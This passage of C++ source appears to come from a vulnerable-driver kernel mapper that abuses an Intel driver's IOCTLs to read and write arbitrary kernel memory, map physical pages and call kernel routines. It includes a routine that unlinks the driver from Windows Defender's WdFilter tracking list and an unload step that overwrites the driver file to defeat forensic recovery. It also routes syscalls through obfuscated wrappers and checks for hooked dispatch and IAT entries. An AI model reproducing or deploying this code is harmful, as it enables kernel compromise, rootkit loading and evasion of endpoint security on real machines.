		if (buffer != nullptr) {
			SIZE_T free_size = 0;
			shadowsyscall<NTSTATUS>("NtFreeVirtualMemory", NtCurrentProcess, &buffer, &free_size, MEM_RELEASE);
		}
		Log(L"[!] NtQuerySystemInformation failed: " << std::hex << status << std::endl);
		return 0;
	}

	uint64_t object = 0;

	auto system_handle_information = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);
	auto current_pid = shadowcall<DWORD>("GetCurrentProcessId");
	for (auto i = 0u; i < system_handle_information->HandleCount; ++i)
	{
		const nt::SYSTEM_HANDLE current_system_handle = system_handle_information->Handles[i];

		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(current_pid)))
			continue;

		if (current_system_handle.HandleValue == device_handle)
		{
			object = reinterpret_cast<uint64_t>(current_system_handle.Object);
			break;
		}
	}

	SIZE_T free_size = 0;
	shadowsyscall<NTSTATUS>("NtFreeVirtualMemory", NtCurrentProcess, &buffer, &free_size, MEM_RELEASE);

	if (!object) {
		Log(L"[!] Object not found for handle" << std::endl);
		return 0;
	}

	uint64_t device_object = 0;
	if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
		Log(L"[!] Failed to find device_object" << std::endl);
		return 0;
	}

	uint64_t driver_object = 0;
	if (!ReadMemory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
		Log(L"[!] Failed to find driver_object" << std::endl);
		return 0;
	}

	uint64_t driver_section = 0;
	if (!ReadMemory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
		Log(L"[!] Failed to find driver_section" << std::endl);
		return 0;
	}

	uint64_t major_function_idx14 = 0;
	if (!ReadMemory(device_handle, driver_object + 0x70 + (14 * sizeof(void*)), &major_function_idx14, sizeof(major_function_idx14)) || !major_function_idx14) {
		Log(L"[!] Failed to find major_function index 14" << std::endl);
		return 0;
	}

	uint64_t driver_start = 0;
	if (!ReadMemory(device_handle, driver_object + 0x18, &driver_start, sizeof(driver_start)) || !driver_start) {
		Log(L"[!] Failed to find driver_start" << std::endl);
		return 0;
	}

	uint64_t driver_size = 0;
	if (!ReadMemory(device_handle, driver_object + 0x20, &driver_size, sizeof(driver_size)) || !driver_size) {
		Log(L"[!] Failed to find driver_size" << std::endl);
		return 0;
	}

	uint64_t driver_end = driver_start + driver_size;

	int ret = 1;
	if (major_function_idx14 >= driver_start && major_function_idx14 < driver_end) {
		Log(L"[+] Driver Dispatch is within the driver's address range" << std::endl);
	}
	else {
		Log(L"[!] Driver Dispatch is NOT within the driver's address range, kdstinker found" << std::endl);
		ret = 2;
	}


	IMAGE_DOS_HEADER dos_header = { 0 };
	if (!ReadMemory(device_handle, driver_start, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE) {
		Log(L"[!] Failed to read DOS header or invalid DOS signature" << std::endl);
		return false;
	}

	uint64_t nt_headers_address = driver_start + dos_header.e_lfanew;
	IMAGE_NT_HEADERS nt_headers = { 0 };
	if (!ReadMemory(device_handle, nt_headers_address, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE) {
		Log(L"[!] Failed to read NT headers or invalid NT signature" << std::endl);
		return false;
	}

	IMAGE_DATA_DIRECTORY iat_directory = { 0 };
	if (!ReadMemory(device_handle, nt_headers_address + offsetof(IMAGE_NT_HEADERS, OptionalHeader) + offsetof(IMAGE_OPTIONAL_HEADER, DataDirectory) + IMAGE_DIRECTORY_ENTRY_IAT * sizeof(IMAGE_DATA_DIRECTORY),
		&iat_directory, sizeof(iat_directory))) {
		Log(L"[!] Failed to read IAT directory" << std::endl);
		return false;
	}

	uint64_t iat_rva = iat_directory.VirtualAddress;
	uint64_t iat_size = iat_directory.Size;

	if (iat_rva == 0 || iat_size == 0) {
		Log(L"[!] No IAT found in the driver" << std::endl);
		return false;
	}

	uint64_t ntoskrnl_base = utils::GetKernelModuleAddress("ntoskrnl.exe");
	uint64_t hal_base = utils::GetKernelModuleAddress("hal.dll");

	if (!ntoskrnl_base || !hal_base) {
		Log(L"[!] Failed to get module bases" << std::endl);
		return false;
	}

	std::unordered_map<uint64_t, std::pair<std::wstring, std::string>> valid_exports; // address -> (module_name, function_name)

	auto add_module_exports = [&](uint64_t base, const std::wstring& module_name) -> bool {
		IMAGE_DOS_HEADER dos_header = { 0 };
		if (!ReadMemory(device_handle, base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE) {
			Log(L"[!] Failed to read DOS header for " << module_name << std::endl);
			return false;
		}

		IMAGE_NT_HEADERS nt_headers = { 0 };
		if (!ReadMemory(device_handle, base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) ||
			nt_headers.Signature != IMAGE_NT_SIGNATURE) {
			Log(L"[!] Failed to read NT headers for " << module_name << std::endl);
			return false;
		}

		auto export_dir_rva = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		auto export_dir_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

		IMAGE_EXPORT_DIRECTORY export_dir = { 0 };
		if (!ReadMemory(device_handle, base + export_dir_rva, &export_dir, sizeof(export_dir))) {
			Log(L"[!] Failed to read export directory for " << module_name << std::endl);
			return false;
		}

		// Read function addresses
		std::vector<DWORD> functions(export_dir.NumberOfFunctions);
		if (!ReadMemory(device_handle, base + export_dir.AddressOfFunctions,
			functions.data(), export_dir.NumberOfFunctions * sizeof(DWORD))) {
			Log(L"[!] Failed to read function addresses for " << module_name << std::endl);
			return false;
		}

		// Read name ordinals
		std::vector<WORD> ordinals(export_dir.NumberOfNames);
		if (!ReadMemory(device_handle, base + export_dir.AddressOfNameOrdinals,
			ordinals.data(), export_dir.NumberOfNames * sizeof(WORD))) {
			Log(L"[!] Failed to read ordinals for " << module_name << std::endl);
			return false;
		}

		// Read name RVAs
		std::vector<DWORD> name_rvas(export_dir.NumberOfNames);
		if (!ReadMemory(device_handle, base + export_dir.AddressOfNames,
			name_rvas.data(), export_dir.NumberOfNames * sizeof(DWORD))) {
			Log(L"[!] Failed to read name RVAs for " << module_name << std::endl);
			return false;
		}

		// Create a map of ordinal to name for quick lookup
		std::unordered_map<WORD, std::string> ordinal_to_name;
		for (DWORD i = 0; i < export_dir.NumberOfNames; i++) {
			char name_buffer[256] = { 0 };
			if (ReadMemory(device_handle, base + name_rvas[i], name_buffer, sizeof(name_buffer))) {
				ordinal_to_name[ordinals[i]] = name_buffer;
			}
		}

		// Store functions with their names
		for (DWORD i = 0; i < export_dir.NumberOfFunctions; i++) {
			if (functions[i] != 0) {
				uint64_t export_addr = base + functions[i];
				std::string func_name = "Unknown";

				// Try to find name for this function
				auto it = ordinal_to_name.find(static_cast<WORD>(i));
				if (it != ordinal_to_name.end()) {
					func_name = it->second;
				}

				valid_exports[export_addr] = std::make_pair(module_name, func_name);
			}
		}
		return true;
		};

	// Add exports from both modules
	if (!add_module_exports(ntoskrnl_base, L"ntoskrnl.exe") ||
		!add_module_exports(hal_base, L"hal.dll")) {
		Log(L"[!] Failed to parse module exports" << std::endl);
		return false;
	}

	// Check IAT entries against valid exports from both modules
	uint64_t iat_start = driver_start + iat_rva;
	for (size_t i = 0; i < iat_size / sizeof(uint64_t); ++i) {
		uint64_t function_ptr = 0;
		if (!ReadMemory(device_handle, iat_start + i * sizeof(uint64_t), &function_ptr, sizeof(function_ptr))) {
			Log(L"[!] Failed to read IAT entry at index: " << i << std::endl);
			continue;
		}

		// Skip NULL entries
		if (function_ptr == 0) {
			continue;
		}

		// Check if this function address exists in our valid exports map
		auto it = valid_exports.find(function_ptr);
		if (it == valid_exports.end()) {
			Log(L"[!] Hooked IAT entry found at index " << i << " with address: 0x" << std::hex << function_ptr
				<< " - Address does not match any known export" << std::endl);
			return 2;
		}
		else {
			const auto& [module_name, func_name] = it->second;
			// Now logs both module name and function name
			Log(L"[+] Verified IAT entry at index " << i << " from " << module_name
				<< L": " << std::wstring(func_name.begin(), func_name.end())
				<< L" (0x" << std::hex << function_ptr << L")" << std::endl);
		}
	}

	Log(L"[+] All IAT entries verified against module exports" << std::endl);
	return ret;
}

__forceinline bool intel_driver::ClearWdFilterDriverList(HANDLE device_handle) {

	auto WdFilter = utils::GetKernelModuleAddress("WdFilter.sys");
	if (!WdFilter) {
		Log("[+] WdFilter.sys not loaded, clear skipped" << std::endl);
		return true;
	}

	auto RuntimeDriversList = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)("\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05"), ("xxx????xx"));
	if (!RuntimeDriversList) {
		Log("[!] Failed to find WdFilter RuntimeDriversList" << std::endl);
		return false;
	}

	auto RuntimeDriversCountRef = FindPatternInSectionAtKernel(device_handle, ("PAGE"), WdFilter, (PUCHAR)("\xFF\x05\x00\x00\x00\x00\x48\x39\x11"), ("xx????xxx"));
	if (!RuntimeDriversCountRef) {
		Log("[!] Failed to find WdFilter RuntimeDriversCount" << std::endl);
		return false;
	}

	// MpCleanupDriverInfo->MpFreeDriverInfoEx 23110
	/*
		49 8B C9                      mov     rcx, r9         ; P
		49 89 50 08                   mov     [r8+8], rdx
		E8 FB F0 FD FF                call    MpFreeDriverInfoEx
		48 8B 0D FC AA FA FF          mov     rcx, cs:qword_1C0021BF0
		E9 21 FF FF FF                jmp     loc_1C007701A
	*/
	auto MpFreeDriverInfoExRef = FindPatternInSectionAtKernel(device_handle, ("PAGE"), WdFilter, (PUCHAR)("\x49\x8B\xC9\x00\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9"), ("xxx?x?xx???????????x"));
	if (!MpFreeDriverInfoExRef) {
		// 24010 
		/*
			48 89 4A 08                   mov     [rdx+8], rcx
			49 8B C8                      mov     rcx, r8         ; P
			E8 C3 58 FE FF                call    sub_1C0065308
			48 8B 0D 44 41 FA FF          mov     rcx, cs:qword_1C0023B90
			E9 39 FF FF FF                jmp     loc_1C007F98A
		*/
		MpFreeDriverInfoExRef = FindPatternInSectionAtKernel(device_handle, ("PAGE"), WdFilter, (PUCHAR)("\x48\x89\x4A\x00\x49\x8b\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9"), ("xxx?xx?x???????????x"));
		if (!MpFreeDriverInfoExRef) {
			Log("[!] Failed to find WdFilter MpFreeDriverInfoEx" << std::endl);
			return false;
		}
		else {
			Log("[+] Found WdFilter MpFreeDriverInfoEx with second pattern" << std::endl);
		}

	}

	MpFreeDriverInfoExRef += 0x7; // skip until call instruction

	RuntimeDriversList = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)RuntimeDriversList, 3, 7);
	uintptr_t RuntimeDriversList_Head = RuntimeDriversList - 0x8;
	uintptr_t RuntimeDriversCount = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)RuntimeDriversCountRef, 2, 6);
	uintptr_t RuntimeDriversArray = RuntimeDriversCount + 0x8;
	ReadMemory(device_handle, RuntimeDriversArray, &RuntimeDriversArray, sizeof(uintptr_t));
	uintptr_t MpFreeDriverInfoEx = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)MpFreeDriverInfoExRef, 1, 5);

	auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY* { // Usefull lambda to read LIST_ENTRY
		LIST_ENTRY* Entry;
		if (!ReadMemory(device_handle, Address, &Entry, sizeof(LIST_ENTRY*))) return 0;
		return Entry;
		};

	for (LIST_ENTRY* Entry = ReadListEntry(RuntimeDriversList_Head);
		Entry != (LIST_ENTRY*)RuntimeDriversList_Head;
		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
	{
		UNICODE_STRING Unicode_String;
		if (ReadMemory(device_handle, (uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING))) {
			auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
			if (ReadMemory(device_handle, (uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
				if (wcsstr(ImageName.get(), intel_driver::GetDriverNameW().c_str())) {

					//remove from RuntimeDriversArray
					bool removedRuntimeDriversArray = false;
					PVOID SameIndexList = (PVOID)((uintptr_t)Entry - 0x10);
					for (int k = 0; k < 256; k++) { // max RuntimeDriversArray elements
						PVOID value = 0;
						ReadMemory(device_handle, RuntimeDriversArray + (k * 8), &value, sizeof(PVOID));
						if (value == SameIndexList) {
							PVOID emptyval = (PVOID)(RuntimeDriversCount + 1); // this is not count+1 is position of cout addr+1
							WriteMemory(device_handle, RuntimeDriversArray + (k * 8), &emptyval, sizeof(PVOID));
							removedRuntimeDriversArray = true;
							break;
						}
					}

					if (!removedRuntimeDriversArray) {
						Log("[!] Failed to remove from RuntimeDriversArray" << std::endl);
						return false;
					}

					auto NextEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Flink)));
					auto PrevEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Blink)));

					WriteMemory(device_handle, uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)), &PrevEntry, sizeof(LIST_ENTRY::Blink));
					WriteMemory(device_handle, uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)), &NextEntry, sizeof(LIST_ENTRY::Flink));


					// decrement RuntimeDriversCount
					ULONG current = 0;
					ReadMemory(device_handle, RuntimeDriversCount, &current, sizeof(ULONG));
					current--;
					WriteMemory(device_handle, RuntimeDriversCount, &current, sizeof(ULONG));

					// call MpFreeDriverInfoEx
					uintptr_t DriverInfo = (uintptr_t)Entry - 0x20;

					//verify DriverInfo Magic
					USHORT Magic = 0;
					ReadMemory(device_handle, DriverInfo, &Magic, sizeof(USHORT));
					if (Magic != 0xDA18) {
						Log("[!] DriverInfo Magic is invalid, new wdfilter version?, driver info will not be released to prevent bsod" << std::endl);
					}
					else {
						CallKernelFunction<void>(device_handle, nullptr, MpFreeDriverInfoEx, DriverInfo);
					}

					Log("[+] WdFilterDriverList Cleaned: " << ImageName << std::endl);
					return true;
				}
			}
		}
	}
	return false;
}

PVOID intel_driver::FindUnusedSpace(HANDLE device_handle, uintptr_t base, unsigned long section_size, size_t required_size, size_t chunk_size) {

	if (required_size > section_size) {
		Log(L"[-] Required size is larger than the section size" << std::endl);
		return nullptr;
	}

	std::vector<UCHAR> buffer(chunk_size);

	unsigned long max_offset = section_size - required_size;

	for (unsigned long i = 0; i <= max_offset; i += chunk_size) {
		size_t read_size = (i + chunk_size > section_size) ? (section_size - i) : chunk_size;

		if (!intel_driver::ReadMemory(device_handle, base + i, buffer.data(), read_size)) {
			Log(L"[-] Failed to read memory at: " << reinterpret_cast<void*>(base + i) << std::endl);
			return nullptr;
		}

		for (size_t j = 0; j <= read_size - required_size; j++) {
			bool found_space = true;
			for (size_t k = 0; k < required_size; k++) {
				if (buffer[j + k] != 0x00) {
					found_space = false;
					break;
				}
			}
			if (found_space) {
				return reinterpret_cast<PVOID>(base + i + j);
			}
		}
	}

	return nullptr;
}

bool intel_driver::Unload(HANDLE device_handle) {
	Log(L"[<] Unloading vulnerable driver" << std::endl);

	if (device_handle && device_handle != INVALID_HANDLE_VALUE) {
		(CloseHandle)(device_handle);
		//sys<NTSTATUS>("NtClose", device_handle);
	}

	if (!StopAndRemove(GetDriverNameW()))
		return false;

	std::wstring driver_path = GetDriverPath();

	//Destroy disk information before unlink from disk to prevent any recover of the file
	std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
	int newFileLen = sizeof(intel_driver_resource::driver) + (((long long)rand() * (long long)rand()) % 2000000 + 1000);
	BYTE* randomData = new BYTE[newFileLen];
	for (size_t i = 0; i < newFileLen; i++) {
		randomData[i] = (BYTE)(rand() % 255);
	}
	if (!file_ofstream.write((char*)randomData, newFileLen)) {
		Log(L"[!] Error dumping shit inside the disk" << std::endl);
	}
	else {
		Log(L"[+] Vul driver data destroyed before unlink" << std::endl);
	}
	file_ofstream.close();
	delete[] randomData;

	//unlink the file
	if ((_wremove)(driver_path.c_str()) != 0)
		return false;

	return true;
}

__forceinline bool intel_driver::MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size) {
	if (!destination || !source || !size)
		return false;
	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };
	copy_memory_buffer.case_number = 0x33;
	copy_memory_buffer.source = source;
	copy_memory_buffer.destination = destination;
	copy_memory_buffer.length = size;

	IO_STATUS_BLOCK io_status_block;

	NTSTATUS status = shadowsyscall<NTSTATUS>("NtDeviceIoControlFile",
		device_handle,                // FileHandle
		nullptr,                      // Event
		nullptr,                      // ApcRoutine
		nullptr,                      // ApcContext
		&io_status_block,             // IoStatusBlock
		ioctl1,              // IoControlCode
		&copy_memory_buffer,          // InputBuffer
		sizeof(copy_memory_buffer),   // InputBufferLength
		nullptr,                      // OutputBuffer
		0                             // OutputBufferLength
	);


	if (!NT_SUCCESS(status)) {
		return false;
	}

	return true;
}

__forceinline bool intel_driver::GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address) {
	if (!address)
		return false;

	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };
	get_phys_address_buffer.case_number = 0x25;
	get_phys_address_buffer.address_to_translate = address;

	IO_STATUS_BLOCK io_status_block;
	NTSTATUS status = shadowsyscall<NTSTATUS>("NtDeviceIoControlFile",
		device_handle,                // FileHandle
		nullptr,                      // Event
		nullptr,                      // ApcRoutine
		nullptr,                      // ApcContext
		&io_status_block,             // IoStatusBlock
		ioctl1,              // IoControlCode
		&get_phys_address_buffer,     // InputBuffer
		sizeof(get_phys_address_buffer),  // InputBufferLength
		&get_phys_address_buffer,     // OutputBuffer (same as input)
		sizeof(get_phys_address_buffer)   // OutputBufferLength
	);

	if (!NT_SUCCESS(status)) {
		return false;
	}

	*out_physical_address = get_phys_address_buffer.return_physical_address;

	return true;
}

__forceinline uint64_t intel_driver::MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size) {
	if (!physical_address || !size)
		return 0;

	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };
	map_io_space_buffer.case_number = 0x19;
	map_io_space_buffer.physical_address_to_map = physical_address;
	map_io_space_buffer.size = size;

	IO_STATUS_BLOCK io_status_block;
	NTSTATUS status = shadowsyscall<NTSTATUS>("NtDeviceIoControlFile",
		device_handle,                // FileHandle
		nullptr,                      // Event
		nullptr,                      // ApcRoutine
		nullptr,                      // ApcContext
		&io_status_block,             // IoStatusBlock
		ioctl1,              // IoControlCode
		&map_io_space_buffer,         // InputBuffer
		sizeof(map_io_space_buffer),  // InputBufferLength
		&map_io_space_buffer,         // OutputBuffer
		sizeof(map_io_space_buffer)   // OutputBufferLength
	);

	if (!NT_SUCCESS(status)) {
		return 0;
	}

	return map_io_space_buffer.return_virtual_address;
}

__forceinline bool intel_driver::UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size) {
	if (!address || !size)
		return false;

	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };
	unmap_io_space_buffer.case_number = 0x1A;
	unmap_io_space_buffer.virt_address = address;
	unmap_io_space_buffer.number_of_bytes = size;

	IO_STATUS_BLOCK io_status_block;
	NTSTATUS status = shadowsyscall<NTSTATUS>("NtDeviceIoControlFile",
		device_handle,                // FileHandle
		nullptr,                      // Event
		nullptr,                      // ApcRoutine
		nullptr,                      // ApcContext
		&io_status_block,             // IoStatusBlock
		ioctl1,              // IoControlCode
		&unmap_io_space_buffer,       // InputBuffer
		sizeof(unmap_io_space_buffer),// InputBufferLength
		nullptr,                      // OutputBuffer
		0                             // OutputBufferLength
	);

	return NT_SUCCESS(status);
}

__forceinline bool intel_driver::ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(device_handle, reinterpret_cast<uint64_t>(buffer), address, size);
}

__forceinline bool intel_driver::WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(device_handle, address, reinterpret_cast<uint64_t>(buffer), size);
}

__forceinline bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size) {
	if (!address || !buffer || !size)
		return false;

	uint64_t physical_address = 0;

	if (!GetPhysicalAddress(device_handle, address, &physical_address)) {
		Log(L"[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl);
		return false;
	}

	const uint64_t mapped_physical_memory = MapIoSpace(device_handle, physical_address, size);

	if (!mapped_physical_memory) {
		Log(L"[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
		return false;
	}

	bool result = WriteMemory(device_handle, mapped_physical_memory, buffer, size);

#if defined(DISABLE_OUTPUT)
	UnmapIoSpace(device_handle, mapped_physical_memory, size);
#else
	if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
		Log(L"[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
#endif


	return result;
}

__forceinline uint64_t intel_driver::MmAllocateIndependentPagesEx(HANDLE device_handle, uint32_t size)
{
	uint64_t allocated_pages{};

	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;

	if (!kernel_MmAllocateIndependentPagesEx)
	{
		kernel_MmAllocateIndependentPagesEx = intel_driver::FindPatternInSectionAtKernel(device_handle, (char*)(".text"), intel_driver::ntoskrnlAddr,
			(BYTE*)("\xE8\x00\x00\x00\x00\x48\x89\x05\x00\x00\x00\x00\x48\x85\xC0\x74\x0D\x4C\x8B"),
			(char*)("x????xxx????xxxxxxx"));
		if (!kernel_MmAllocateIndependentPagesEx) {

			kernel_MmAllocateIndependentPagesEx = intel_driver::FindPatternInSectionAtKernel(device_handle, (char*)("PAGE"), intel_driver::ntoskrnlAddr, // 24h2 26100.3xxx
				(BYTE*)("\xE8\x00\x00\x00\x00\x48\x8B\xD8\x48\x85\xC0\x74\x00\x48\x8B\x0D"),
				(char*)("x????xxxxxxx?xxx"));
			if (!kernel_MmAllocateIndependentPagesEx) {
				Log(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
				return 0;
			}
		}

		kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5);
		if (!kernel_MmAllocateIndependentPagesEx) {
			Log(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}
	}

	if (!intel_driver::CallKernelFunction(device_handle, &allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
		return 0;

	return allocated_pages;
}

__forceinline uint64_t intel_driver::MmRemovePhysicalMemory(HANDLE device_handle, uint64_t address, size_t size) {
	NTSTATUS status;

	static uint64_t kernel_MmRemovePhysicalMemory = 0;

	if (!kernel_MmRemovePhysicalMemory)
	{
		kernel_MmRemovePhysicalMemory = intel_driver::FindPatternInSectionAtKernel(device_handle, (char*)("PAGE"), intel_driver::ntoskrnlAddr,
			(BYTE*)("\xE8\x00\x00\x00\x00\x85\xC0\x79\x0A\xBB\x00\x00\x00\x00\xE9\x00\x00\x00\x00\x48\x8B\x0F"),
			(char*)("x????xxxxx????x????xxx"));
		if (!kernel_MmRemovePhysicalMemory) {
			Log(L"[!] Failed to find MmRemovePhysicalMemory" << std::endl);
			return 0;
		}

		//kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5);
		//if (!kernel_MmAllocateIndependentPagesEx) {
		//	Log(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
		//	return 0;
		//}
	}

	if (!intel_driver::CallKernelFunction(device_handle, &status, kernel_MmRemovePhysicalMemory, address, size))
		return 0;

	return status;
}
__forceinline uint64_t intel_driver::MiGetPteAddress(HANDLE device_handle, uint64_t address)
{
	uint64_t pte{};

	static uint64_t kernel_MiGetPteAddress = 0;

	if (!kernel_MiGetPteAddress)
	{
		kernel_MiGetPteAddress = intel_driver::FindPatternInSectionAtKernel(device_handle, (char*)(".text"), intel_driver::ntoskrnlAddr,
			(BYTE*)("\x48\xC1\xE9\x09\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00\x48\x23\xC8\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00\x48\x03\xC1\xC3"),
			(char*)("xxxxxx????????xxxxx????????xxxx"));
		if (!kernel_MiGetPteAddress) {
			Log(L"[!] Failed to find MiGetPteAddress" << std::endl);
			return 0;
		}

		//kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5);
		//if (!kernel_MmAllocateIndependentPagesEx) {
		//	Log(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
		//	return 0;
		//}
	}

	if (!intel_driver::CallKernelFunction(device_handle, &pte, kernel_MiGetPteAddress, address))
		return 0;

	return pte;
}

// 
__forceinline uint64_t intel_driver::MiGetPdeAddress(HANDLE device_handle, uint64_t address)
{
	uint64_t pde{};

	static uint64_t kernel_MiGetPdeAddress = 0;

	if (!kernel_MiGetPdeAddress)
	{
		kernel_MiGetPdeAddress = intel_driver::FindPatternInSectionAtKernel(device_handle, (char*)(".text"), intel_driver::ntoskrnlAddr,
			(BYTE*)("\x48\xC1\xE9\x12\x81\xE1\x00\x00\x00\x00\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00\x48\x03\xC1\xC3"),
			(char*)("xxxxxx????xx????????xxxx"));
		if (!kernel_MiGetPdeAddress) {
			Log(L"[!] Failed to find MiGetPdeAddress" << std::endl);
			return 0;
		}

	}

	if (!intel_driver::CallKernelFunction(device_handle, &pde, kernel_MiGetPdeAddress, address))
		return 0;

	return pde;
}

__forceinline bool intel_driver::MmFreeIndependentPages(HANDLE device_handle, uint64_t address, uint32_t size)
{
	static uint64_t kernel_MmFreeIndependentPages = 0;

	if (!kernel_MmFreeIndependentPages)
	{
		kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel(device_handle, ("PAGE"), intel_driver::ntoskrnlAddr,
			(BYTE*)("\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD0\x48\x8D\x0D\x00\x00\x00\x00"),
			(char*)("x????xxx????x????xxxxxx????"));
		if (!kernel_MmFreeIndependentPages) {
			Log(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
			return false;
		}

		kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmFreeIndependentPages, 1, 5);
		if (!kernel_MmFreeIndependentPages) {
			Log(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
			return false;
		}
	}

	uint64_t result{};
	return intel_driver::CallKernelFunction(device_handle, &result, kernel_MmFreeIndependentPages, address, size);
}

__forceinline BOOLEAN intel_driver::MmSetPageProtection(HANDLE device_handle, uint64_t address, uint32_t size, ULONG new_protect)
{
	if (!address)
	{
		Log(L"[!] Invalid address passed to MmSetPageProtection" << std::endl);
		return FALSE;
	}

	static uint64_t kernel_MmSetPageProtection = 0;

	if (!kernel_MmSetPageProtection)
	{
		kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel(device_handle, (".text"), intel_driver::ntoskrnlAddr,
			(BYTE*)("\xE8\x00\x00\x00\x00\x48\x83\x67\x00\x00\x48\x8B\x5C\x24\x00\x48\x89\x77\x20\x48\x8B\x74\x24\x00\x48\x83\xC4\x20\x5F\xC3"),
			(char*)("x????xxx??xxxx?xxxxxxxx?xxxxxx"));
		if (!kernel_MmSetPageProtection) {
			Log(L"[!] Failed to find MmSetPageProtection" << std::endl);
			return FALSE;
		}

		kernel_MmSetPageProtection = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmSetPageProtection, 1, 5);
		if (!kernel_MmSetPageProtection) {
			Log(L"[!] Failed to find MmSetPageProtection" << std::endl);
			return FALSE;
		}
	}

	BOOLEAN set_prot_status{};
	if (!intel_driver::CallKernelFunction(device_handle, &set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
		return FALSE;

	return set_prot_status;
}


__forceinline bool intel_driver::FreePool(HANDLE device_handle, uint64_t address) {
	if (!address)
		return 0;

	static uint64_t kernel_ExFreePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, ("ExFreePool"));

	if (!kernel_ExFreePool) {
		Log(L"[!] Failed to find ExAllocatePool" << std::endl);
		return 0;
	}

	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExFreePool, address);
}

inline uint64_t intel_driver::GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name) {
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!ReadMemory(device_handle, kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!ReadMemory(device_handle, kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

